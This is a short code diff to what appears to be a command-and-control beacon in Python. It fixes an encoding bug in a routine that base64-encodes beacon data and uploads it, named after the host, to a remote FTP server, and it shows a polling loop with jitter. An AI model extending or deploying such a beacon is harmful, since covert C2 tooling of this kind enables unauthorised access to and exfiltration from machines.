@@ -51,8 +51,9 @@ class Beacon:
             time.sleep(self.jitter)
 
     def stor(self):
-        payload = base64.urlsafe_b64encode(json.dumps(self._build_beacon(self.target, self.links)))
-        self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload.encode()))
+        b = json.dumps(self._build_beacon(self.target, self.links))
+        payload = base64.urlsafe_b64encode(b.encode())
+        self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload))
         self.links = []
 
     def retr(self):
@@ -97,4 +98,5 @@ if __name__ == '__main__':
     parser.add_argument('-P', '--password', required=False, default='password', help='Password to auth')
     parser.add_argument('-J', '--jitter', required=False, default=10)
     args = parser.parse_args()
+
     Beacon(args.host, args.user, args.password, args.jitter).monitor()
